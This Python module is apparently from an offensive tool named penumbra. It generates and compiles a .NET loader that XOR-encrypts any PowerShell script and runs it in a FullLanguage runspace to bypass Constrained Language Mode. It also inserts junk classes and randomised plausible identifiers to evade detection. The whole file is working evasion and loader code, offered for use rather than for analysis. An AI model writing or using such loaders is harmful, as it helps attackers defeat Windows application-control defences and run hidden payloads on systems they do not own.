"""CLM bypass pass — wraps PS1 payload in a .NET exe that creates a FullLanguage runspace.

The generated exe:
1. Creates a PowerShell Runspace via RunspaceFactory.CreateRunspace() (defaults to FullLanguage)
2. Creates a PowerShell object attached to the runspace
3. XOR-decrypts the embedded PS1 payload at runtime
4. Executes via AddScript() + Invoke()
5. Writes results to console

Targets net472 to use GAC-resident System.Management.Automation.dll.
"""

from __future__ import annotations

import base64
import os
import secrets
import shutil
import tempfile
from pathlib import Path

from penumbra.dotnet._loader_utils import (
    compile_dotnet_project,
    generate_junk_class,
    plausible_class,
    plausible_field,
    plausible_name,
    xor_encrypt,
)
from penumbra.types import PassConfig


def _generate_clm_project(
    payload_b64: str, key_b64: str, project_dir: Path
) -> None:
    """Generate a C# project that bypasses CLM by creating a FullLanguage runspace."""
    used = set[str]()

    main_cls = plausible_class()
    used.add(main_cls)
    entry_method = plausible_name()
    key_field = plausible_field()
    payload_field = plausible_field()
    result_var = plausible_field()
    plain_var = plausible_field()
    script_var = plausible_field()
    rs_var = plausible_field()
    ps_var = plausible_field()
    output_var = plausible_field()
    idx_var = plausible_field()

    # .csproj — net472 Exe referencing System.Management.Automation from GAC
    sma_hint = (
        r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL"
        r"\System.Management.Automation"
        r"\v4.0_3.0.0.0__31bf3856ad364e35"
        r"\System.Management.Automation.dll"
    )
    (project_dir / "Loader.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        "  <PropertyGroup>\n"
        "    <OutputType>Exe</OutputType>\n"
        "    <TargetFramework>net472</TargetFramework>\n"
        "    <LangVersion>10</LangVersion>\n"
        "  </PropertyGroup>\n"
        "  <ItemGroup>\n"
        '    <Reference Include="System.Management.Automation">\n'
        f"      <HintPath>{sma_hint}</HintPath>\n"
        "    </Reference>\n"
        "  </ItemGroup>\n"
        "</Project>\n"
    )

    # Junk classes
    for i in range(secrets.randbelow(3) + 3):
        junk_src = generate_junk_class(used)
        (project_dir / f"Module{i}.cs").write_text(
            "using System;\n\n" + junk_src
        )

    program_cs = (
        "using System;\n"
        "using System.Management.Automation;\n"
        "using System.Management.Automation.Runspaces;\n"
        "using System.Text;\n\n"
        f"internal static class {main_cls}\n"
        "{\n"
        f'    private static readonly string {key_field} = "{key_b64}";\n'
        f'    private static readonly string {payload_field} = "{payload_b64}";\n\n'
        f"    private static void {entry_method}(string[] args)\n"
        "    {\n"
        f"        var {result_var} = Convert.FromBase64String({payload_field});\n"
        f"        var {idx_var} = Convert.FromBase64String({key_field});\n"
        f"        var {plain_var} = new byte[{result_var}.Length];\n"
        f"        for (var i = 0; i < {result_var}.Length; i++)\n"
        f"            {plain_var}[i] = (byte)({result_var}[i]"
        f" ^ {idx_var}[i % {idx_var}.Length]);\n"
        f"        var {script_var} = Encoding.UTF8.GetString({plain_var});\n\n"
        "        if (args.Length > 0)\n"
        "        {\n"
        f"            {script_var} = Encoding.UTF8.GetString(\n"
        "                Convert.FromBase64String(args[0]));\n"
        "        }\n\n"
        f"        using (var {rs_var} = RunspaceFactory.CreateRunspace())\n"
        "        {\n"
        f"            {rs_var}.Open();\n"
        f"            using (var {ps_var} = PowerShell.Create())\n"
        "            {\n"
        f"                {ps_var}.Runspace = {rs_var};\n"
        f"                {ps_var}.AddScript({script_var});\n"
        f"                var {output_var} = {ps_var}.Invoke();\n"
        f"                foreach (var obj in {output_var})\n"
        "                {\n"
        "                    if (obj != null)\n"
        "                        Console.WriteLine(obj.ToString());\n"
        "                }\n"
        "            }\n"
        "        }\n"
        "    }\n\n"
        f"    private static void Main(string[] args) => {entry_method}(args);\n"
        "}\n"
    )
    (project_dir / "Program.cs").write_text(program_cs)


class ClmBypassPass:
    """Wrap PS1 payload in a .NET exe that creates a FullLanguage runspace.

    Input: PS1 script bytes
    Output: compiled .NET Framework 4.7.2 exe bytes
    """

    opt_in = True

    @property
    def name(self) -> str:
        return "clm-bypass"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        # XOR encrypt the PS1 payload
        key = os.urandom(32)
        encrypted = xor_encrypt(data, key)
        payload_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        tmp_dir = tempfile.mkdtemp(prefix="penumbra_clm_")
        tmp_path = Path(tmp_dir)

        try:
            _generate_clm_project(payload_b64, key_b64, tmp_path)

            if config.extra.get("source"):
                from penumbra.dotnet._loader_utils import export_source_project

                output_dir = Path(str(config.extra.get("source_output", tmp_path)))
                export_source_project(tmp_path, output_dir)
                return b""

            if not shutil.which("dotnet"):
                raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")
            return compile_dotnet_project(tmp_path, "net472")
        finally:
            if not config.extra.get("source"):
                shutil.rmtree(tmp_dir, ignore_errors=True)
